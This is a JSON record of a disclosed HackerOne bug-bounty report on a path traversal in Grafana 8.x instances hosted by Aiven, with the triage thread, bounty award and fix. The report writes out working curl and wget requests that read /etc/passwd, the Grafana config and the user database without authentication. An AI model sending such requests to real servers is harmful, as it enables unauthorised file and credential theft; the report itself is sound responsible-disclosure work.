@@ -1,0 +1,508 @@
+{
+    "id": 1415820,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDE1ODIw",
+    "url": "https://hackerone.com/reports/1415820",
+    "title": "Zero day path traversal vulnerability in Grafana 8.x allows unauthenticated arbitrary local file read",
+    "state": "Closed",
+    "substate": "resolved",
+    "severity_rating": "high",
+    "readable_substate": "Resolved",
+    "created_at": "2021-12-02T20:56:34.870Z",
+    "submitted_at": "2021-12-02T20:56:34.934Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "j0v",
+        "url": "/j0v",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/9MwzMPq6b3gY9VoVUmCo7F28/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 45650,
+        "url": "https://hackerone.com/aiven_ltd",
+        "handle": "aiven_ltd",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/4dvu0xq9iacojs2s7fgkd3pbu87f/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/4dvu0xq9iacojs2s7fgkd3pbu87f/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Aiven Ltd",
+            "twitter_handle": "",
+            "website": "https://aiven.io",
+            "about": "Fully-managed and hosted database and messaging services on all major clouds in dozens of regions worldwide."
+        }
+    },
+    "has_bounty?": true,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": true,
+    "disclosed_at": "2021-12-14T10:59:00.381Z",
+    "bug_reporter_agreed_on_going_public_at": null,
+    "team_member_agreed_on_going_public_at": "2021-12-14T10:58:39.313Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "## Summary:\nHi team,\n\nI've found a path traversal issue in the Grafana instances hosted on the Aiven platforms. With the path traversal it's possible for an unauthenticated user to read arbitrary files on the server.\n\n## Steps To Reproduce:\n\n  1. Login at https://console.aiven.io\n  1. Create a new Grafana instance and wait till it's up and running\n  1.Run the following curl command to get the content of the /etc/passwd file on the server:\n```\ncurl https://grafana-303ca6f8-████.aivencloud.com/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\n```\n\nOutput:\n```\n$ curl https://grafana-303ca6f8-███████.aivencloud.com/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\nroot:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\ngames:x:12:100:games:/usr/games:/sbin/nologin\nftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\nnobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin\n███\n█████\n██████\n██████████\n██████████\n████████\n██████\nsystemd-network:x:192:192:systemd Network Management:/:/sbin/nologin\nsystemd-coredump:x:992:991:systemd Core Dumper:/:/sbin/nologin\nsystemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin\nsystemd-timesync:x:991:990:systemd Time Synchronization:/:/sbin/nologin\n██████████\ndbus:x:81:81:System message bus:/:/sbin/nologin\n█████\n████████\n██████\n█████████\n██████████\n███\n██████████\n███\n█████\n█████████\n██████████\n███\n███\n████\n███\n```\n\nSome other examples:\n\nSee the Grafana config:\n```\ncurl --path-as-is https://grafana-303ca6f8-█████████.aivencloud.com/public/plugins/mysql/../../../../../../../../../../../../usr/share/grafana/conf/defaults.ini\n```\n\nI'll keep my Grafana instance running so you can try to reproduce it with the examples above.\n\n## Impact\n\nAn unauthenticated user can get access to all system files if he knows the exact path of the file.",
+    "bounty_amount": "1000.0",
+    "formatted_bounty": "$1,000",
+    "weakness": {
+        "id": 19,
+        "name": "Path Traversal"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [],
+    "allow_singular_disclosure_at": null,
+    "vote_count": 102,
+    "voters": [
+        "patrick666",
+        "p4n7h3rx",
+        "n1m0",
+        "mrmax4o4",
+        "testt0",
+        "alp",
+        "drsniper",
+        "youstin",
+        "ar6aaz",
+        "harbitz",
+        "and 92 more..."
+    ],
+    "severity": {
+        "rating": "high",
+        "score": 7.5,
+        "author_type": "User",
+        "metrics": {
+            "attack_vector": "network",
+            "attack_complexity": "low",
+            "privileges_required": "none",
+            "user_interaction": "none",
+            "scope": "unchanged",
+            "confidentiality": "high",
+            "integrity": "none",
+            "availability": "none"
+        }
+    },
+    "structured_scope": {
+        "databaseId": 69451,
+        "asset_type": "OTHER",
+        "asset_identifier": "Aiven for Grafana managed and hosted service",
+        "max_severity": "critical"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 14530256,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @j0v,\n\nThank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nHave a great day! \n\nKind regards,\n@retina",
+            "automated_response": false,
+            "created_at": "2021-12-03T10:02:03.674Z",
+            "updated_at": "2021-12-03T10:02:03.674Z",
+            "actor": {
+                "username": "h1_analyst_andrew",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_andrew",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/hicyvmkr86el0s0lkf4vovjs9vpa/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": true,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "aiven_ltd"
+        },
+        {
+            "id": 14530548,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugNeedsMoreInfo",
+            "message": "Hi @j0v - Thank you for the report. I was able to reproduce the behavior on your instance.\n\nI wasn't able to create an instance of mine since it requires a card, so before I send this to the team, can you please point out whether this is a 0-day in Grafana? Does it have a CVE assigned? \n\nIf not, what is the misconfiguration on Aiven's end that causes this? \n\nRegards,\n@retina",
+            "automated_response": false,
+            "created_at": "2021-12-03T10:21:09.878Z",
+            "updated_at": "2021-12-03T10:21:09.878Z",
+            "actor": {
+                "username": "h1_analyst_andrew",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_andrew",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/hicyvmkr86el0s0lkf4vovjs9vpa/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": true,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "aiven_ltd"
+        },
+        {
+            "id": 14530608,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugNew",
+            "message": "Hi @retina,\n\nYou can register for a new trial account at Aiven so you can create new instances without a needed payment.\nI reported it to Grafana so it's kind of a 0-day. However a lot of instances on the web are protected by using a WAF or proxy which already filters out or normalized path traversal characters. I think this can be fixed before the actual patch is out.\n\nRegards,\n@j0v",
+            "automated_response": false,
+            "created_at": "2021-12-03T10:24:24.182Z",
+            "updated_at": "2021-12-03T10:24:24.182Z",
+            "actor": {
+                "username": "j0v",
+                "cleared": false,
+                "verified": false,
+                "url": "/j0v",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/9MwzMPq6b3gY9VoVUmCo7F28/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "aiven_ltd"
+        },
+        {
+            "id": 14552056,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "The data in the Aiven Grafana instance is stored in a Sqlite database file. It's possible to download this file with the path traversal:\n```\nwget -L -O ~/Downloads/██████https://grafana-303ca6f8-████.aivencloud.com/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F██████\n```\nThis database contains the users and all data for Grafana.\n\n```\nsqlite> select * from user;\n████\n```",
+            "automated_response": false,
+            "created_at": "2021-12-05T19:44:14.802Z",
+            "updated_at": "2021-12-14T10:59:39.887Z",
+            "actor": {
+                "username": "j0v",
+                "cleared": false,
+                "verified": false,
+                "url": "/j0v",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/9MwzMPq6b3gY9VoVUmCo7F28/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "aiven_ltd"
+        },
+        {
+            "id": 14554871,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-12-06T05:42:10.358Z",
+            "updated_at": "2021-12-06T05:42:10.358Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 1416959
+            },
+            "actor": {
+                "username": "cdl",
+                "cleared": true,
+                "verified": true,
+                "url": "/cdl",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/pjn96wngvyyvquwg2vukftoern72/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "aiven_ltd"
+        },
+        {
+            "id": 14560796,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "Team confirmed the issue.",
+            "automated_response": false,
+            "created_at": "2021-12-06T11:52:12.573Z",
+            "updated_at": "2021-12-06T11:52:12.573Z",
+            "actor": {
+                "username": "h1_analyst_andrew",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_andrew",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/hicyvmkr86el0s0lkf4vovjs9vpa/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": true,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "aiven_ltd"
+        },
+        {
+            "id": 14618485,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I just received an email that my Grafana instance at Aiven is automatically updated. Good to see :-).\n",
+            "automated_response": false,
+            "created_at": "2021-12-10T07:46:50.284Z",
+            "updated_at": "2021-12-10T07:46:50.284Z",
+            "actor": {
+                "username": "j0v",
+                "cleared": false,
+                "verified": false,
+                "url": "/j0v",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/9MwzMPq6b3gY9VoVUmCo7F28/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "attachments": [
+                {
+                    "id": 1540018,
+                    "filename": "Schermafbeelding_2021-12-10_om_08.43.41.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/m8ifne1f7eqyzm092oo6r4jsqqfp?response-content-disposition=attachment%3B%20filename%3D%22Schermafbeelding_2021-12-10_om_08.43.41.png%22%3B%20filename%2A%3DUTF-8%27%27Schermafbeelding_2021-12-10_om_08.43.41.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVJW3J6EC%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070454Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCWT1ruwqc2oByytevVo%2BJwP5CuUSNHvk0vuHjxZNpbLwIgOeoSnb%2FmdjXdZewytaps5XSg7IBiDxrlnkPD4i4CPYQqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDLBJNUdbbKZCYT0C9iqOBfQku%2B5Azcmj5AdB26nMf2ktZjuwR6Yf4mPl5dRw8xv2hbew%2FoTfHwa8uWbUsVP9%2BQ665LZktOXNtzcEk9YLJjsfltqCGOMjArmHXmO7DtjVZe3bT0CMddibsG2oRFE7MeZylLi%2FFLZ0h%2FkP2bvhv3QlPoZkzCfXnpogf2P7rP%2F0GFJYUV1cisHR6KFbgfW66l2YxBzZ2V2Df9C3KnNChUUzRLCYvb7MEp4KqRsH1CLheeBdqqLc8BtygBE77gETUQ07bkoOeLsyiEpR%2FZoTIjptSkwBiumi7HuDADkKTm%2F6pA4pVvOmQpAGJX8LEjG3R0lNEknX5P2pyl%2FfQjUhY5caRl%2B5vA0schYyxRSTFl8K1qZKq3N5P8dYZGoaPL9mth2MpCbpA0sIP5P0AYL98nH8Jqj%2FWth%2Fea29XnC4psIkWAzWSPN0jZYIKoEoViHFRgO6yQHL9xCuF7ynS8W4LG4hV6L3AW%2Bwp57nG66Z5psn2lNXAFrWQ8VINXw83pZi6oX%2FPggl3B6CXC421yVsNhkVCBquvicjntQ0w0a0JyNhxZG%2BJuNFjoxgmgxcd4LjTLj4w0y8lklVezsXkk2oz%2FPzNfZ0nL7YublRW5M7zRIiVMSYxPiaLA2x9wkpm5T2HXRNb0g0DTEwU04WhLxx4s6qhC%2BNOqyzXZGnkSfurTs469C%2Ftknm5s6rloLtHob%2FmnmYTsvKGxwm8akqMvmt9Bvr8yfEipq%2BKofcRExYGv5YVdhx9YfKPpflQz%2FnkY61%2BuKWWSLYWeB%2BLuh44oQ3vSiVtc5u%2F%2FtdEHzv6REX2VBOzT4LqaXBd9rktSPvodB8%2B5xFqRdmFj%2F6E2XkiyFiX0KLK9YixTtIXOs7FnoxcjCtrLanBjqxAUPHVGDrO9%2F7ASqx4OaO99QIBf0eY2DXvMOeQvwnrwFxMpGyyzIg5MV%2F1oK4cuDnvJtz%2F3K6XMfkdEUx1qDm1nXD%2B17RHnlMaiK0PeA3%2BHeYHE7yUoNYIF6%2B8LYu4P31sIBrZXX4seXS4n1KOzFO%2Bhlx1O%2Bs4ih71Ivq0Qs%2F6ETyi7f6yaW%2B9BTt9hM5qGA0MOAHq7RTE7Txq3kubk4%2F5o5CjZ%2FqtgPwlnf0oWR9sY%2B8hw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d4c242fdd91f1a2c5bb22c521d7ff0874bb066f63c30577268c290d873091450"
+                }
+            ],
+            "genius_execution_id": null,
+            "team_handle": "aiven_ltd"
+        },
+        {
+            "id": 14624529,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportTitleUpdated",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-12-10T13:33:23.953Z",
+            "updated_at": "2021-12-10T13:33:23.953Z",
+            "additional_data": {
+                "old_title": "Unauthenticated arbitrary file read in Grafana instances",
+                "new_title": "Zero day path traversal vulnerability in Grafana 8.x allows unauthenticated arbitrary local file read"
+            },
+            "actor": {
+                "username": "tapioaiven",
+                "cleared": false,
+                "verified": false,
+                "url": "/tapioaiven",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "aiven_ltd"
+        },
+        {
+            "id": 14624613,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-12-10T13:44:02.236Z",
+            "updated_at": "2021-12-10T13:44:02.236Z",
+            "actor": {
+                "username": "tapioaiven",
+                "cleared": false,
+                "verified": false,
+                "url": "/tapioaiven",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "aiven_ltd"
+        },
+        {
+            "id": 14628347,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BountyAwarded",
+            "message": "High - path traversal\n\nNice catch!",
+            "automated_response": false,
+            "created_at": "2021-12-10T16:00:37.949Z",
+            "updated_at": "2021-12-10T16:00:37.949Z",
+            "actor": {
+                "url": "/aiven_ltd",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/4dvu0xq9iacojs2s7fgkd3pbu87f/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "Aiven Ltd"
+                }
+            },
+            "bounty_amount": "1000.0",
+            "bonus_amount": "0.0",
+            "bounty_currency": "usd",
+            "genius_execution_id": null,
+            "team_handle": "aiven_ltd",
+            "collaborator": {
+                "username": "j0v",
+                "url": "/j0v"
+            }
+        },
+        {
+            "id": 14628444,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugNeedsMoreInfo",
+            "message": "Hey @j0v \n\nJust checking if you are happy with us to disclose this report? We are just discussing internally but we would likely like to disclose it.\n\nCheers,\n",
+            "automated_response": false,
+            "created_at": "2021-12-10T16:02:11.730Z",
+            "updated_at": "2021-12-10T16:02:11.730Z",
+            "actor": {
+                "username": "staaldraad_aiven",
+                "cleared": false,
+                "verified": false,
+                "url": "/staaldraad_aiven",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/4zcpkifaw1vn39twad384jyg151f/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "aiven_ltd"
+        },
+        {
+            "id": 14628696,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugNew",
+            "message": "Thanks! Yes no problem :-).",
+            "automated_response": false,
+            "created_at": "2021-12-10T16:35:03.251Z",
+            "updated_at": "2021-12-10T16:35:03.251Z",
+            "actor": {
+                "username": "j0v",
+                "cleared": false,
+                "verified": false,
+                "url": "/j0v",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/9MwzMPq6b3gY9VoVUmCo7F28/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "aiven_ltd"
+        },
+        {
+            "id": 14671149,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugResolved",
+            "message": "Thanks again\n\nTapio\nteam Aiven",
+            "automated_response": false,
+            "created_at": "2021-12-14T10:57:32.441Z",
+            "updated_at": "2021-12-14T10:57:32.441Z",
+            "actor": {
+                "username": "tapioaiven",
+                "cleared": false,
+                "verified": false,
+                "url": "/tapioaiven",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "reporter": {
+                "username": "j0v",
+                "url": "/j0v"
+            },
+            "genius_execution_id": null,
+            "team_handle": "aiven_ltd"
+        },
+        {
+            "id": 14671157,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-12-14T10:58:39.333Z",
+            "updated_at": "2021-12-14T10:58:39.333Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "tapioaiven",
+                "cleared": false,
+                "verified": false,
+                "url": "/tapioaiven",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "aiven_ltd"
+        },
+        {
+            "id": 14671174,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ManuallyDisclosed",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-12-14T10:59:00.239Z",
+            "updated_at": "2021-12-14T10:59:00.239Z",
+            "actor": {
+                "username": "tapioaiven",
+                "cleared": false,
+                "verified": false,
+                "url": "/tapioaiven",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "aiven_ltd"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
